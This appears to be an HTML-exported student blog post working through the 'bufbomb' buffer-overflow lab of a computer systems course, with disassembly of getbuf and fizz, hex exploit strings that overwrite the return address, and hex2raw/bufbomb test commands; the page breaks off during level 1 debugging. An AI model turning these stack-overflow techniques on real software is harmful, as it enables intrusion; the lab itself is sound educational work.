<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F10daba46-51b9-474a-9c22-1222e6e158b2%2FPMI74K6FO73MCR770JT.png?table=collection&amp;id=51a399fe-3ada-47de-a312-8e2ad5e56579">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>实验四buffer&nbsp;|&nbsp;这儿是什么地方</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="实验四buffer">
  
    <meta name="description" content="计算机系统实验4 bufbomb">
    <meta property="og:description" content="计算机系统实验4 bufbomb">
  
  
    <meta property="og:image" content="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🧨&lt;/text&gt;&lt;/svg&gt;">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="index.html">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F10daba46-51b9-474a-9c22-1222e6e158b2%2FPMI74K6FO73MCR770JT.png?table=collection&amp;id=51a399fe-3ada-47de-a312-8e2ad5e56579"></span>&nbsp;
      
      <span>SixGoogle</span>
    </div>
  </a>
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="about-me-1b4752.html">
        <div class="Navbar__Btn">
          
            <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;😀&lt;/text&gt;&lt;/svg&gt;"></span>&nbsp;
          
          <span>About me?</span>
        </div>
      </a>
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
      <div class="Header__Cover">
        <img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc1a10e65-dd1c-45eb-b010-3c3912359e5d%2Fpreview.jpg?table=block&amp;id=673cb7b0-027f-4651-bfc2-ed1cd9c463d3">
      </div>
    
    <div class="Header__Spacer ">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🧨&lt;/text&gt;&lt;/svg&gt;"></span>
      </div>
    
    <h1 class="Header__Title">实验四buffer</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Fri, May 24, 2024</span>
        
        
      </div>
    
  </header>
  <article id="https://www.notion.so/673cb7b0027f4651bfc2ed1cd9c463d3" class="PageRoot"><div id="https://www.notion.so/679ec61a7b7443378d93ae792a084084" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fdd0715a2-6d01-478b-9d2f-ee20e3b5b919%2FUntitled.png?width=783&amp;table=block&amp;id=679ec61a-7b74-4337-8d93-ae792a084084"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fdd0715a2-6d01-478b-9d2f-ee20e3b5b919%2FUntitled.png?width=783&amp;table=block&amp;id=679ec61a-7b74-4337-8d93-ae792a084084" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b9147bfb4d944dfc994c4be359eb626e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">用学号生成一个cookie先，</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x206b4e28</code></span></span></p></div><h1 id="https://www.notion.so/91877842718e4b8798cabe42a0dc4357" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/91877842718e4b8798cabe42a0dc4357"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">做什么</span></span></h1><div id="https://www.notion.so/33a3663d32464a2083cf8f3964394f37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.csdn.net/longzaizai_/article/details/124559539">实验三-Bufflab（缓冲区溢出攻击、buffbomb/buffbomb）实验总结_缓冲区溢出攻击实验总结-CSDN博客</a></span></span></p></div><h2 id="https://www.notion.so/1ed1435d8a7e4ccd8b78b01b6f35c294" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/1ed1435d8a7e4ccd8b78b01b6f35c294"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">实现原理</span></span></h2><div id="https://www.notion.so/310352ff03b043bc87e34ce991d75383" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">BUFBOMB program读取输入用下面的函数</span></span></p></div><pre id="https://www.notion.so/720fbdc10fe74ae8971071d9a82e4972" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token number">1</span> <span class="token comment">/* Buffer size for getbuf */</span>
<span class="token number">2</span> #define NORMAL_BUFFER_SIZE <span class="token number">32</span>
<span class="token number">3</span>
<span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token number">5</span> <span class="token punctuation">{</span>
<span class="token number">6</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span>NORMAL_BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token number">7</span> <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">8</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token number">9</span> <span class="token punctuation">}</span>  </span></span></span></code></pre><div id="https://www.notion.so/3779ed65844643d2b0b501a491a5089a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Gets读取输入，以/n回车结束，读取的数据存入buf，可能会溢出</span></span></p></div><div id="https://www.notion.so/c946cbf97e79483f96fda6e11d8c1acd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">输入恶意的长字符。突破Gets的栈帧，控制覆盖getbuf的栈帧，完成攻击
</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HEX2RAW ：</strong></span><span class="SemanticString">，它能将十六进制格式的字符串转换为原始二进制格式。在输入给HEX2RAW的数据中，每个字节值由两个十六进制数字表示，字节之间用空白（空格或换行符）分隔，允许使用注释格式为</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">/* 注释内容 */</strong></code></span></span></p></div><div id="https://www.notion.so/8cab79e91de24360865db922546cea50" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">注意 </strong></span></span></p></div><div id="https://www.notion.so/7b1b259d588a4296a2ec4feb3056da85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">字符串中间</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">不包含0x0A（换行符）</mark></span><span class="SemanticString"> ； 确保每个十六进制值都是</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">两位数，且之间有空白分隔</mark></span><span class="SemanticString">。</span></span></p></div><div id="https://www.notion.so/7473d4ba258546958935b2bd3e340ffe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">测试命令</strong></span></span></p></div><div id="https://www.notion.so/ca18c19b6e4a42cd9c2f714f1620b973" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat leverx.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span></span></p></div><div id="https://www.notion.so/d4e37e38f36d469592598aad93343c6e" class="ColumnList"><div id="https://www.notion.so/bcf40c25a6854edd8c788859a04eb0ac" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.0625)"><div id="https://www.notion.so/4815fe9beb3a4233960574abacf99c3b" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc7e23ac0-be84-4c90-9ecd-404014368759%2FUntitled.png?width=87&amp;table=block&amp;id=4815fe9b-eb3a-4233-9605-74abacf99c3b"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc7e23ac0-be84-4c90-9ecd-404014368759%2FUntitled.png?width=87&amp;table=block&amp;id=4815fe9b-eb3a-4233-9605-74abacf99c3b" style="width:87px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div><div id="https://www.notion.so/eb2f4aa910394efdbfac80d6406982c9" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.9375000000000002)"><div id="https://www.notion.so/476c17b5b58a433fb5e104f663b8ce61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">输入着玩</span></span></p></div></div></div><div id="https://www.notion.so/25f95c79fe9e45a796cfe06343154f39" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F8fdb53da-c5cc-4a86-b9c7-ec12ca74cfde%2FUntitled.png?width=707.9923706054688&amp;table=block&amp;id=25f95c79-fe9e-45a7-96cf-e06343154f39"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F8fdb53da-c5cc-4a86-b9c7-ec12ca74cfde%2FUntitled.png?width=707.9923706054688&amp;table=block&amp;id=25f95c79-fe9e-45a7-96cf-e06343154f39" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e0eb3e59e84544d3a91de379d081900c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">得分析汇编，还是在32位虚拟机objdump出来，在vs看，wsl调试</span></span></p></div><h1 id="https://www.notion.so/bd0dbaa9611340f291e25426b594fb90" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/bd0dbaa9611340f291e25426b594fb90"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever0- Candle 蜡烛</span></span></h1><div id="https://www.notion.so/a5af76f762da42039ada50058292beb1" class="ColumnList"><div id="https://www.notion.so/38c20fa96ac0438a81ad593ed33cee91" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/c08a1f8bf8324adea2cd4e66574e328e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">让BUFBOMB在getbuf执行其返回语句时执行smoke的代码，而不是返回到test。请注意，您的漏洞利用字符串也可能破坏与此阶段不直接相关的堆栈部分，但这不会导致问题，因为smoke会导致程序直接退出。</span></span></p></div></div><div id="https://www.notion.so/b7900200332741159c98acddd257e527" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/4b54b5d00a244e3e984679bd863f340e" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F1049393a-5310-4f62-bff9-288b0305340b%2FUntitled.png?width=369&amp;table=block&amp;id=4b54b5d0-0a24-4e3e-9846-79bd863f340e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F1049393a-5310-4f62-bff9-288b0305340b%2FUntitled.png?width=369&amp;table=block&amp;id=4b54b5d0-0a24-4e3e-9846-79bd863f340e" style="width:369px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/f1a72c446e6247c2bc66fcff2372b81c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></div></div><pre id="https://www.notion.so/e3d2435b2b984c228f1a7abfd50db939" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08049262 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getbuf</span><span class="token punctuation">></span></span>:
 8049262:	55                   	push   %ebp
 8049263:	89 e5                	mov    %esp,%ebp
 8049265:	83 ec 38             	sub    $0x38,%esp
 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax
 #说明缓冲区大小是0x28 40字节
 804926b:	89 04 24             	mov    %eax,(%esp)
 804926e:	e8 bf f9 ff ff       	call   8048c32 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Gets</span><span class="token punctuation">></span></span>
 8049273:	b8 01 00 00 00       	mov    $0x1,%eax
 #返回eax是1
 8049278:	c9                   	leave  
 8049279:	c3                   	ret    
 804927a:	90                   	nop
 804927b:	90                   	nop
 804927c:	90                   	nop
 804927d:	90                   	nop
 804927e:	90                   	nop
 804927f:	90                   	nop</span></span></span></code></pre><div id="https://www.notion.so/c39305a915214918afa7c3931b109204" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">要去smoke的地址是08048e0a,但是字符串中间不应出现0a,考虑从0b进入，跳过push %ebp</span></span></p></div><div id="https://www.notion.so/63892e60c25a4068968c6ef4abe73156" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">那么就修改返回地址，用40个字符填满缓冲区后，再用4个字符覆盖old ebp 然后四个字符覆盖返回地址，用小端法是 0b 8e 04 08</span></span></p></div><div id="https://www.notion.so/f2878bfeb97641dbb7d78b295e4cdba9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">得
</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 0b 8e 04 08</strong></mark></span></span></p></div><div id="https://www.notion.so/7abad2bf59714d13aaa7ce8e5e1ee680" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat lever0.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span></span></p></div><div id="https://www.notion.so/41b49387aff341c88fdc9f67665bb880" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F38493e75-d9aa-4252-b37a-79f47181f55b%2FUntitled.png?width=1589&amp;table=block&amp;id=41b49387-aff3-41c8-8fdc-9f67665bb880"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F38493e75-d9aa-4252-b37a-79f47181f55b%2FUntitled.png?width=1589&amp;table=block&amp;id=41b49387-aff3-41c8-8fdc-9f67665bb880" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h1 id="https://www.notion.so/7c90f54d28a246d098cb6160cda520d5" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/7c90f54d28a246d098cb6160cda520d5"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever1-Sparkler 火花</span></span></h1><div id="https://www.notion.so/cfad57eaf708455eb8639e50c2fce260" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Faf5c2e2b-fa32-4373-8468-ec242ec9c5d4%2FUntitled.png?width=558&amp;table=block&amp;id=cfad57ea-f708-455e-b863-9e50c2fce260"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Faf5c2e2b-fa32-4373-8468-ec242ec9c5d4%2FUntitled.png?width=558&amp;table=block&amp;id=cfad57ea-f708-455e-b863-9e50c2fce260" style="width:558px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4085e96fd0f144629586bcf43efe4b4e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">调用fizz，但这次需要修改val为我的cookie</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x206b4e28</code></span></span></p></div><pre id="https://www.notion.so/b94650506c954eec993adc198b39079f" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08048daf <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fizz</span><span class="token punctuation">></span></span>:
 8048daf:	55                   	push   %ebp
 8048db0:	89 e5                	mov    %esp,%ebp
 8048db2:	83 ec 18             	sub    $0x18,%esp
 8048db5:	8b 45 08             	mov    0x8(%ebp),%eax
 8048db8:	3b 05 04 d1 04 08    	cmp    0x804d104,%eax
 # 0x8(%ebp)放的就是val，需要修改他为我的cookie
 8048dbe:	75 26                	jne    8048de6 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fizz+0x37</span><span class="token punctuation">></span></span>
 ……</span></span></span></code></pre><div id="https://www.notion.so/7774308e375549cb905a0d66043a95d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">如果是通过缓冲区溢出修改返回地址到达fizz，那么只需要0x8(%ebp)是cookie即可</span></span></p></div><div id="https://www.notion.so/44e320ee0c9544ea8a9d22b055f4e6c4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">即</span></span></p></div><div id="https://www.notion.so/170c970d2a6040d4b4442923c3873d20" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"> 00</mark></span><span class="SemanticString"> af 8d 04 08
28 4e 6b 20</span></span></p></div><div id="https://www.notion.so/448a81e1ac1a4eb8b1889283b78351bd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat lever1.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span><span class="SemanticString"> 段错误？</span></span></p></div><div id="https://www.notion.so/fd0172d0301e4f79b6d9bca4c45c36fe" class="ColumnList"><div id="https://www.notion.so/f658919c17fd4b8ea41fab1ef2f6c104" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.875)"><div id="https://www.notion.so/ec346908eeb14fb881a0b9a39744057f" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F33c811fc-b585-499c-8b91-610b3d978ba6%2FUntitled.png?width=947&amp;table=block&amp;id=ec346908-eeb1-4fb8-81a0-b9a39744057f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F33c811fc-b585-499c-8b91-610b3d978ba6%2FUntitled.png?width=947&amp;table=block&amp;id=ec346908-eeb1-4fb8-81a0-b9a39744057f" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div><div id="https://www.notion.so/e349b810e7074844be3c8ffb95e32abd" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.12500000000000006)"><div id="https://www.notion.so/68bfd4af6e1a4e8d8f3a2e10b06f54d7" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc16fa627-5a53-4022-bb06-bd98b54def19%2FUntitled.jpeg?width=160&amp;table=block&amp;id=68bfd4af-6e1a-4e8d-8f3a-2e10b06f54d7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc16fa627-5a53-4022-bb06-bd98b54def19%2FUntitled.jpeg?width=160&amp;table=block&amp;id=68bfd4af-6e1a-4e8d-8f3a-2e10b06f54d7" style="width:160px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><div id="https://www.notion.so/5114b29a7e7b482e9b2c9500164a5cb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">！当getbuf返回后old ebp不应该被修改</del></span></span></p></div><div id="https://www.notion.so/93e725e9ebd44b8e8a3b4ee04ca70a5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">(gdb) run -u 202208060120 &lt; lever1.txt</code></span></span></p></div><div id="https://www.notion.so/be9c63d399c740f5b0adad8261cfadbb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">在getbufleave前打断点发现</del></span></span></p></div><div id="https://www.notion.so/1c4fab5d23964477ae840440df7630b5" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F13d156c6-b65f-44c6-bbf7-70e53b6ea4f9%2FUntitled.png?width=602&amp;table=block&amp;id=1c4fab5d-2396-4477-ae84-0440df7630b5"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F13d156c6-b65f-44c6-bbf7-70e53b6ea4f9%2FUntitled.png?width=602&amp;table=block&amp;id=1c4fab5d-2396-4477-ae84-0440df7630b5" style="width:602px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0831e272039a4cb1850081ada0fceb57" class="ColumnList"><div id="https://www.notion.so/36096fe39add4bbaa56035bd0914562f" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/35aad12451694392b56bc95230b9e2e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">执行leave后</del></span></span></p></div><div id="https://www.notion.so/3c62e56d410048dd8bdc6b24b60100a0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">oldebp是右边这个 未成功修改old ebp</del></span></span></p></div></div><div id="https://www.notion.so/073f59c2133943bdae5af312dc11a0de" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/9bbdf00c7ef747ea92edff7b166bb906" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F03a60738-fd9d-4e92-b1df-2b8f22ac488c%2FUntitled.png?width=273&amp;table=block&amp;id=9bbdf00c-7ef7-47ea-92ed-ff7b166bb906"><img 